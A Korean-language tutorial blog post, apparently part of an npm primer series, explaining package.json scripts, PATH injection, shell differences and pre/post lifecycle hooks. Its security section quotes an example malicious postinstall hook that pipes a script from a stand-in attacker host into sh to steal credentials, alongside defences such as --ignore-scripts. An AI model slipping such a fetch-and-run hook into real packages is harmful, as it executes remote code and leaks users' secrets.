@@ -1,0 +1,434 @@
+---
+title: '(9/14) npm scripts — package.json 의 공용 동사 사전'
+description: 'scripts 필드는 임의의 쉘 명령에 짧은 이름을 붙이는 곳. node_modules/.bin 자동 PATH 주입, sh vs bash 함정, postinstall 의 보안 위험까지.'
+pubDate: 'May 3 2026'
+category: about-nodejs
+series: 'npm-primer'
+seriesOrder: 9
+heroImage: '../../../assets/hero-about-nodejs.png'
+---
+
+<style>{`
+  .term { color: var(--accent); font-weight: 700; }
+  .key { color: var(--claude-dark); font-weight: 700; }
+  .mod {
+    font-family: ui-monospace, "SF Mono", "Cascadia Mono", Consolas, Menlo, monospace;
+    font-size: 0.92em;
+    padding: 1px 6px;
+    border-radius: 4px;
+    background: rgba(96, 115, 159, 0.10);
+    color: rgb(var(--gray-dark));
+  }
+  .callout { background: rgba(96, 115, 159, 0.07); border-radius: 8px; padding: 1em 1.25em; margin: 1.5em 0; }
+  .callout-accent { border-left: 4px solid var(--accent); background: rgba(35, 55, 255, 0.04); padding: 0.85em 1.15em; margin: 1.5em 0; border-radius: 0 8px 8px 0; }
+  .callout-warm { border-left: 4px solid var(--claude); background: rgba(204, 120, 92, 0.06); padding: 0.85em 1.15em; margin: 1.5em 0; border-radius: 0 8px 8px 0; }
+  .note-box { border: 1px dashed rgba(96, 115, 159, 0.35); border-radius: 8px; padding: 0.7em 1em; margin: 1.25em 0; font-size: 0.95em; color: rgb(var(--gray-dark)); }
+  .compare-table { width: 100%; border-collapse: collapse; margin: 1.5em 0; font-size: 0.95em; line-height: 1.55; }
+  .compare-table th, .compare-table td { padding: 0.6em 0.85em; border-bottom: 1px solid rgb(var(--gray-light)); text-align: left; vertical-align: top; }
+  .compare-table th { background: rgba(var(--gray-light), 0.5); font-weight: 700; color: rgb(var(--black)); }
+  .compare-table tr.highlight { background: rgba(204, 120, 92, 0.08); }
+  .compare-table tr.highlight td { border-bottom-color: rgba(204, 120, 92, 0.3); }
+  .compare-table tr.row-accent { background: rgba(35, 55, 255, 0.05); }
+`}</style>
+
+대부분의 Node 프로젝트 README 는 비슷한 모양으로 시작합니다. <span class="term">npm install</span>, <span class="term">npm run dev</span>, <span class="term">npm test</span>. 이 짧은 줄들이 실제로 뭘 하는지는 <span class="term">package.json</span> 의 scripts 필드를 열어 봐야 알 수 있어요. 이 글은 그 한 필드의 안과 밖을 정리합니다.
+
+## 한 줄 답
+
+<div class="callout-accent">
+<span class="term">package.json</span> 의 <span class="key">scripts</span> 필드는 <span class="key">임의의 쉘 명령에 짧은 이름을 붙이는 곳</span> 이에요. <span class="term">npm run</span> &lt;이름&gt; 으로 호출합니다. 프로젝트마다 자기 식대로 이름을 정하면 되고. 많은 프로젝트가 같은 이름 (build · dev · lint · test 등) 을 쓰는 건 <span class="key">커뮤니티 관례</span> 일 뿐, <span class="term">npm</span> 이 이 이름들에 특별한 의미를 부여하진 않아요. 파이썬으로 치면 Makefile · justfile · [project.scripts] 와 비슷한 자리.
+</div>
+
+<div class="callout-warm">
+명확히 짚고 가면. <span class="term">npm</span> 이 특별히 아는 이름은 <span class="key">딱 네 개</span> (start, test, stop, restart) 예요. 이들만 <span class="term">npm</span> &lt;이름&gt; 단축이 가능하고, 나머지 build · dev · lint 같은 이름은 <span class="key">그냥 관례 이름</span>. 내가 compile 이나 zzz 로 정해도 동작은 똑같습니다.
+</div>
+
+## 문법 기본
+
+```json
+{
+  "scripts": {
+    "start": "node server.js",
+    "dev": "bun run entrypoints/cli.tsx",
+    "build": "tsc",
+    "test": "jest",
+    "lint": "eslint ."
+  }
+}
+```
+
+값은 <span class="key">그냥 쉘 명령 문자열</span> 이에요. <span class="term">npm run</span> &lt;이름&gt; 을 치면 <span class="term">npm</span> 이 그 문자열을 꺼내서 쉘에서 실행합니다. <span class="key">아무 명령이나 올 수 있어요</span>. <span class="term">node</span>, <span class="term">bun</span>, python, bash -c '...', 뭐든.
+
+### 호출 방법: <span class="term">npm run</span> 과 <span class="term">npm</span> &lt;관습적 이름&gt;
+
+<span class="key">npm run &lt;이름&gt; 이 일반 형태</span> 예요. 어떤 스크립트든 이 형태로 불러요.
+
+```bash
+npm run build
+npm run dev
+npm run lint
+npm run start                # ← 이것도 물론 됨
+```
+
+그리고 네 개의 <span class="key">특별한 이름</span> (start, test, stop, restart) 에 한해서 run 을 생략한 단축형도 추가로 쓸 수 있어요.
+
+```bash
+npm start     # = npm run start   (완전히 같은 명령)
+npm test      # = npm run test
+npm stop      # = npm run stop
+npm restart   # = npm run restart
+```
+
+즉 두 형태는 동일한 동작. 단축일 뿐이에요. start · test 계열이 가장 흔한 동작이라 <span class="term">npm</span> 이 편의를 위해 이 네 개만 단축을 허용한 겁니다.
+
+사용자 정의 이름은 단축 안 됩니다.
+
+```bash
+npm run build      # 됨
+npm build          # 에러 ("Unknown command: build")
+
+npm run dev        # 됨
+npm dev            # 에러
+```
+
+위 네 개 외의 이름들은 <span class="key">반드시 npm run</span> 을 붙여야 해요. 헷갈림을 막으려면 <span class="key">"기본은 npm run, 네 개만 예외"</span> 로 기억해 두는 게 안전합니다.
+
+## 왜 중요한가: 프로젝트의 "공용 동사"
+
+<span class="term">npm scripts</span> 가 없으면 README 에 이런 지시가 필요해요.
+
+```
+이 프로젝트 빌드하려면:
+$ npx tsc --build && node scripts/bundle.js --production --target=node20
+
+이 프로젝트 실행하려면:
+$ node --experimental-vm-modules --loader ts-node/esm entrypoints/cli.tsx
+
+테스트는:
+$ node --experimental-vm-modules node_modules/.bin/jest --config jest.config.ts
+```
+
+<span class="term">npm scripts</span> 가 있으면 이렇게 줄어듭니다.
+
+```
+$ npm run build
+$ npm run dev
+$ npm test
+```
+
+<span class="key">세 줄로 끝</span>. 긴 명령은 <span class="term">package.json</span> 안에 숨겨지고, 팀원은 짧은 이름만 외우면 돼요. 프로젝트의 진입점이 어떻게 바뀌어도 외부 지시는 그대로 유지됩니다 (scripts 만 업데이트하면 됨).
+
+## node_modules/.bin/ 가 PATH 에 자동 추가: 핵심 편의
+
+<span class="term">npm scripts</span> 의 가장 중요한 "숨은 기능" 이에요. scripts 안의 명령이 실행될 때 <span class="term">npm</span> 이 <span class="key">그 script 프로세스의 환경 변수에 node_modules/.bin/ 을 PATH 앞에 일시적으로 주입</span> 합니다.
+
+<div class="callout-warm">
+<span class="key">"일시적" 이라는 게 중요해요.</span> 이 PATH 주입은 <span class="key">그 script 실행 프로세스 안에서만 살아 있어요</span>. script 가 끝나면 부모 셸의 PATH 는 원래대로 돌아갑니다. 즉 <span class="term">npm run build</span> 를 친 뒤에 터미널에서 tsc 를 쳐도 여전히 "command not found" 가 나요. <span class="term">npm</span> 이 띄운 자식 프로세스의 환경이었을 뿐.
+</div>
+
+결과: tsc, jest, eslint 같은 <span class="key">로컬 설치된 CLI 를 전역 설치 없이</span> 그냥 이름만으로 호출할 수 있어요. 단 script 안에서만.
+
+```json
+"scripts": {
+  "build": "tsc"
+}
+```
+
+전역 설치를 한 게 아니니까, 터미널에서 직접 tsc 를 치면 "command not found" 가 나요. 하지만 <span class="term">npm run build</span> 안에서는 <span class="key">자동으로 프로젝트 로컬의 tsc</span> 가 실행됩니다.
+
+<div class="callout">
+
+왜 이게 중요?
+
+- <span class="key">버전 충돌 방지</span>: 프로젝트마다 다른 <span class="term">TypeScript</span> 버전을 써도, 각자의 node_modules/.bin/tsc 가 호출됨
+- <span class="key">팀원 환경 통일</span>: 누구는 tsc 5.3, 누구는 5.7 같은 어긋남 없음
+- <span class="key">전역 오염 방지</span>: CLI 도구들을 전역 설치할 필요 없음
+
+</div>
+
+이 PATH 주입이 <span class="term">npm scripts</span> 를 "단순한 명령 단축" 에서 <span class="key">"프로젝트 로컬 환경의 실행 인터페이스"</span> 로 끌어올리는 거예요. (이 동작을 이해하면 다음 글의 node_modules/.bin/ 이 바로 따라옵니다.)
+
+## scripts 의 명령은 터미널 bash 와 같을까?
+
+<span class="key">거의 같지만 완전히 같지는 않아요</span>. <span class="term">npm</span> 이 script 를 실행할 때 실행 맥락을 살짝 바꿔서 돌리기 때문에, "내 터미널에선 되는데 <span class="term">npm run</span> 으로는 안 돼" 같은 혼란이 자주 생겨요. 다섯 가지 차이.
+
+### ① 쉘이 다릅니다 (가장 헷갈리는 지점)
+
+<span class="key">bash 가 아닌 sh</span> (또는 Windows 에선 cmd.exe) 로 실행돼요.
+
+<table class="compare-table">
+  <thead>
+    <tr><th>OS</th><th><span class="term">npm scripts</span> 의 기본 쉘</th><th>여러분 터미널의 기본 쉘</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Linux / macOS</td><td>/bin/sh (POSIX sh — bash 아님)</td><td>대개 bash 또는 zsh</td></tr>
+    <tr><td>Windows</td><td>cmd.exe</td><td>PowerShell 또는 cmd</td></tr>
+  </tbody>
+</table>
+
+즉 터미널에서 쓰던 <span class="key">bash 특수 문법이 안 될 수 있어요</span>.
+
+```bash
+# 터미널 (bash) 에선 동작
+if [[ -f foo.txt ]]; then echo yes; fi    # [[ ... ]] 은 bash 전용
+echo ${VAR,,}                              # 대소문자 변환, bash 전용
+diff <(sort a) <(sort b)                   # process substitution, bash 전용
+
+# npm scripts 안에서는 (sh) 실패할 가능성 높음
+```
+
+필요하면 쉘을 바꿀 수 있긴 해요.
+
+```bash
+npm config set script-shell /bin/bash      # 항상 bash 로 실행
+```
+
+하지만 팀 프로젝트라면 <span class="key">sh 로 돌려도 되게 써 두는 게 이식성상 안전</span>. Windows 를 쓰는 팀원이 있으면 더 그래요.
+
+### ② PATH 가 일시적으로 다름
+
+바로 위에서 본 내용. scripts 안에서는 tsc, jest 같은 로컬 CLI 를 이름만으로 호출 가능.
+
+```bash
+# 터미널에서는
+./node_modules/.bin/tsc        # 경로를 명시하거나
+npx tsc                        # npx 로 돌리거나
+
+# npm scripts 안에서는 그냥
+"build": "tsc"                  # 이름만으로 OK
+```
+
+### ③ 환경 변수가 많이 주입됨
+
+<span class="term">npm</span> 이 script 실행 프로세스에 <span class="key">자동으로 다수의 환경 변수</span> 를 주입합니다.
+
+<table class="compare-table">
+  <thead>
+    <tr><th>변수</th><th>예시 값</th><th>설명</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>npm_package_name</td><td>@anthropic-ai/claude-code-fork</td><td><span class="term">package.json</span> 의 name</td></tr>
+    <tr><td>npm_package_version</td><td>2.1.88-fork.1</td><td>version</td></tr>
+    <tr><td>npm_package_&#42;</td><td>모든 필드</td><td><span class="term">package.json</span> 의 모든 값이 점 노테이션으로</td></tr>
+    <tr><td>npm_config_&#42;</td><td>모든 설정</td><td><span class="term">.npmrc</span> 의 모든 값</td></tr>
+    <tr><td><span class="key">INIT_CWD</span></td><td>/home/jet/project</td><td><span class="term">npm run</span> 을 친 원래 디렉토리</td></tr>
+  </tbody>
+</table>
+
+그래서 script 에서 echo $npm_package_version 같은 걸 쓸 수 있어요. 터미널 일반 환경에선 없는 변수들.
+
+### ④ 작업 디렉토리가 항상 프로젝트 루트
+
+서브디렉토리에서 <span class="term">npm run build</span> 를 쳐도 <span class="term">npm</span> 이 <span class="key">package.json 이 있는 루트로 이동해서 실행</span>. 터미널 명령은 현재 디렉토리에서 돎.
+
+```bash
+cd src/components
+npm run build       # 프로젝트 루트에서 실행됨 (not src/components)
+pwd                 # 여전히 src/components. npm 명령만 루트에서 돈 것
+```
+
+Script 안에서 원래 친 디렉토리를 참조하고 싶으면 $INIT_CWD 를 써요.
+
+### ⑤ 추가 인자 전달은 -- 로
+
+터미널에선 그냥 이어 붙이면 되는데, <span class="term">npm</span> 은 <span class="key">-- 가 필요</span> 합니다.
+
+```bash
+# 터미널
+jest --watch
+
+# npm scripts 로 동등하게 부르려면
+npm run test -- --watch      # -- 가 있어야 --watch 가 jest 에 전달됨
+npm run test --watch         # X. --watch 가 npm 자체의 플래그로 먹힘
+```
+
+### 한눈에 정리
+
+<table class="compare-table">
+  <thead>
+    <tr><th>축</th><th>터미널 bash</th><th><span class="term">npm scripts</span></th></tr>
+  </thead>
+  <tbody>
+    <tr><td>쉘</td><td>bash · zsh</td><td><strong>sh · cmd.exe</strong> (제한적)</td></tr>
+    <tr><td>PATH</td><td>시스템 PATH</td><td><strong>+ node_modules/.bin/</strong> (일시적)</td></tr>
+    <tr><td>환경 변수</td><td>시스템 기본</td><td><strong>+ npm_* 다수</strong></td></tr>
+    <tr><td>작업 디렉토리</td><td>현재 디렉토리</td><td><strong>프로젝트 루트</strong> ($INIT_CWD 로 원래 위치 참조)</td></tr>
+    <tr><td>인자 전달</td><td>그냥 붙임</td><td><strong>-- &lt;인자&gt;</strong> 필요</td></tr>
+  </tbody>
+</table>
+
+즉 <span class="key">쉘 명령 문자열이긴 한데, npm 이 그 실행 맥락을 조금 바꿔서 돌리는</span> 셈이에요. 터미널에서 잘 되던 bash-specific 문법이 script 에서 깨지면 <span class="key">쉘 (/bin/sh) 문제</span> 를 먼저 의심하세요.
+
+## Lifecycle hooks: pre 와 post 자동 체이닝
+
+파이썬에는 없는 독특한 기능이에요. <span class="key">어떤 스크립트 X 를 실행하든</span>, <span class="term">npm</span> 이 자동으로 아래 순서로 연쇄 실행합니다 (존재하는 것만).
+
+```
+preX  →  X  →  postX
+```
+
+<div class="callout-warm">
+핵심. 이 패턴은 <span class="key">임의의 이름 X 에 적용돼요</span>. X 가 start 든, 사용자 정의 build 든, deploy 든, banana 든 상관없음. 즉 prestart 나 prebuild 가 독립적으로 특별한 이름이 아니라, "X 를 실행할 때 pre/post 가 자동으로 걸리는" 패턴의 인스턴스일 뿐이에요.
+</div>
+
+예시:
+
+```json
+"scripts": {
+  "prestart": "echo 'Starting...'",
+  "start": "node server.js",
+  "poststart": "echo 'Started!'",
+
+  "prebuild": "rm -rf dist/",
+  "build": "tsc",
+  "postbuild": "echo 'Build complete!'"
+}
+```
+
+실행 동작:
+
+<table class="compare-table">
+  <thead>
+    <tr><th>실제 명령</th><th><span class="term">npm</span> 이 연쇄 실행하는 것</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><span class="term">npm start</span> (또는 <span class="term">npm run start</span>)</td><td>prestart → start → poststart</td></tr>
+    <tr><td><span class="term">npm run build</span></td><td>prebuild → build → postbuild</td></tr>
+    <tr><td><span class="term">npm run deploy</span> (만약 정의해 두면)</td><td>predeploy → deploy → postdeploy</td></tr>
+  </tbody>
+</table>
+
+파이썬으로 치면 Makefile 의 target 간 의존성과 비슷해요. 하나를 부르면 그 앞뒤가 자동으로 엮이는 것.
+
+### 특수한 hook: preinstall · postinstall
+
+pre/post 접두어는 <span class="key">내장 npm 명령에도</span> 걸 수 있어요. 가장 흔한 건 postinstall.
+
+```json
+"scripts": {
+  "postinstall": "node scripts/setup-config.js"
+}
+```
+
+→ 누가 내 패키지를 <span class="term">npm install</span> 로 설치하면 <span class="key">설치 직후에 자동으로 setup 스크립트가 실행됨</span>.
+
+### 보안 경고: postinstall 은 공격 벡터입니다
+
+<div class="callout-warm">
+<span class="term">npm install</span> 을 치는 것 = <span class="key">수백 개의 패키지가 내 컴퓨터에서 임의 스크립트를 실행할 권한을 주는 것</span> 과 같아요.
+</div>
+
+구체적인 공격 시나리오:
+
+<div class="callout">
+
+1. 공격자가 인기 있는 패키지를 탈취하거나, 유사 이름의 악성 패키지 (typosquatting) 를 publish
+2. 그 패키지의 <span class="term">package.json</span> 에 "postinstall": "curl <span class="term">evil.com/steal.sh</span> | sh" 같은 걸 심음
+3. 누군가 <span class="term">npm install</span> &lt;해당 패키지&gt; 를 하는 순간. <span class="key">설치 완료 직후 자동으로 악성 스크립트가 내 머신에서 실행됨</span>
+4. 환경 변수 (AWS 키 · API 토큰 · SSH 키 등) 가 빠져나갈 수 있음
+
+</div>
+
+이건 이론이 아니에요. event-stream (2018) · <span class="term">node</span>-ipc (2022) · ua-parser-js (2021) 등 <span class="key">실제 발생한 대규모 사건</span> 들이 이 벡터를 이용했습니다.
+
+방어:
+
+<table class="compare-table">
+  <thead>
+    <tr><th>방법</th><th>어떻게</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>--ignore-scripts 플래그</td><td><span class="term">npm install</span> --ignore-scripts — 모든 lifecycle 스크립트 비실행</td></tr>
+    <tr><td>영구 기본값화</td><td><span class="term">npm config set ignore-scripts true</span> — 이후 모든 install 에 기본 적용</td></tr>
+    <tr><td>필요한 것만 수동 실행</td><td><span class="term">npm rebuild</span> &lt;pkg&gt; 로 특정 패키지의 설치 스크립트만 명시적 실행</td></tr>
+  </tbody>
+</table>
+
+회사망 · 프로덕션 머신처럼 <span class="key">신중해야 하는 환경</span> 에서는 ignore 를 기본으로 두고, 빌드에 꼭 필요한 스크립트는 수동으로 돌리는 게 안전합니다.
+
+<div class="note-box">
+파이썬은 이 벡터가 상대적으로 <span class="key">덜 심각</span> 해요. <span class="term">pip</span> 은 기본적으로 <span class="term">setup.py</span> 의 임의 코드 실행이 줄어드는 방향 (wheel 위주) 으로 진화했고, postinstall 같은 강력한 훅이 없습니다. <span class="term">npm</span> 은 빌드 · 설치 시 임의 스크립트 실행이 관례화돼 있어서 공격면이 훨씬 넓어요.
+</div>
+
+## 여러 스크립트 동시 · 순차 실행
+
+간단한 경우는 쉘 문법으로 해결돼요.
+
+```json
+"scripts": {
+  "ci": "npm run lint && npm run typecheck && npm test"
+}
+```
+
+&& 로 이어 붙이면 <span class="key">앞 명령이 성공했을 때만</span> 다음이 실행됨 (쉘 기본 동작).
+
+복잡한 병렬 실행이 필요하면 별도 <span class="term">npm</span> 패키지가 필요해요.
+
+```bash
+npm install -D npm-run-all        # 또는 concurrently
+```
+
+```json
+"scripts": {
+  "all": "npm-run-all --parallel dev watch-css serve-docs"
+}
+```
+
+병렬 실행은 OS · 쉘 간 호환 문제가 있어서 (bash 의 & 는 Windows CMD 에선 안 됨) 이런 도구를 쓰는 게 안전합니다.
+
+## AI 엔지니어가 마주치는 패턴
+
+대부분의 <span class="term">Node.js</span> 프로젝트 README 는 이런 모양으로 시작해요.
+
+```
+## Getting started
+npm install
+npm run dev
+
+## Build
+npm run build
+
+## Test
+npm test
+```
+
+<span class="key">이 짧은 라인들이 실제로 뭘 하는지</span> 는 해당 프로젝트의 <span class="term">package.json</span> 의 scripts 를 열어 봐야 알 수 있어요. 자연스러운 순서:
+
+<div class="callout-accent">
+
+1. README 의 <span class="term">npm run</span> &lt;이름&gt; 을 보고 → <span class="term">package.json</span> 열기
+2. scripts.&lt;이름&gt; 의 실제 명령 확인
+3. 그 명령이 호출하는 개별 도구 (tsc, jest, <span class="term">bun</span> 등) 를 필요하면 찾아보기
+
+</div>
+
+<span class="term">MCP</span> 서버도 "scripts": &#123; "start": "node <span class="term">server.js</span>" &#125; 같은 형태로 <span class="term">package.json</span> 에 들어있는 경우가 흔해요.
+
+## 파이썬과의 대응
+
+완벽한 1:1 대응은 없고, 비슷한 역할을 하는 도구들이 여럿이에요.
+
+<table class="compare-table">
+  <thead>
+    <tr><th>성격</th><th><span class="term">npm</span></th><th><span class="term">Python</span> 생태계</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>프로젝트 로컬 태스크 러너</td><td>scripts + <span class="term">npm run</span></td><td>Makefile · justfile · task</td></tr>
+    <tr><td>패키지가 노출하는 CLI 진입점</td><td>bin 필드</td><td>[project.scripts] (<span class="term">pyproject.toml</span>)</td></tr>
+    <tr><td>일회성 설치 후 실행</td><td><span class="term">npx</span></td><td><span class="term">uvx</span> · <span class="term">pipx</span> run</td></tr>
+  </tbody>
+</table>
+
+<span class="term">npm</span> 의 scripts 가 독특한 건 <span class="key">"패키지 공개 인터페이스" + "프로젝트 태스크 러너"</span> 두 역할을 한 파일 안에서 한다는 점이에요. 파이썬은 이걸 여러 파일 · 도구로 나눠 놓는 편.
+
+<div class="note-box">
+Makefile 과의 미묘한 차이. Makefile 은 기본적으로 <span class="key">"의존 파일이 바뀌었을 때만 재빌드"</span> 라는 incremental build 기능이 있어요. <span class="term">npm scripts</span> 는 그냥 무조건 명령 실행일 뿐. 그런 지능은 없음. 프로젝트가 복잡해지면 <span class="term">package.json</span> 의 scripts 안에서 다시 Makefile 이나 turbo, nx 같은 모노레포 도구를 부르는 패턴이 나와요.
+</div>
+
+## 한 줄 요약
+
+<div class="callout-warm">
+<span class="term">package.json</span> 의 scripts 는 <span class="key">프로젝트의 공용 동사 사전</span> 이에요. 긴 쉘 명령에 짧은 이름을 붙여 <span class="term">npm run</span> &lt;이름&gt; 으로 호출하게. 핵심 편의는 <span class="key">node_modules/.bin/ 이 자동으로 PATH 에 들어감</span> 이라 로컬 설치된 CLI 를 바로 이름으로 쓸 수 있다는 점. pre/post lifecycle hook 으로 자동 체이닝도 됨. Makefile · justfile 자리에 있는 개념이지만 <span class="key">패키지 공개 인터페이스</span> 역할까지 겸한다는 게 <span class="term">npm</span> 만의 특징.
+</div>
+
+다음 글에서는 그 PATH 에 들어가는 node_modules/.bin/ 의 정체. 심볼릭 링크 + shebang 한 줄로 OS 가 JS 파일을 어떻게 "실행" 하게 되는지. 를 풀어 봅니다.
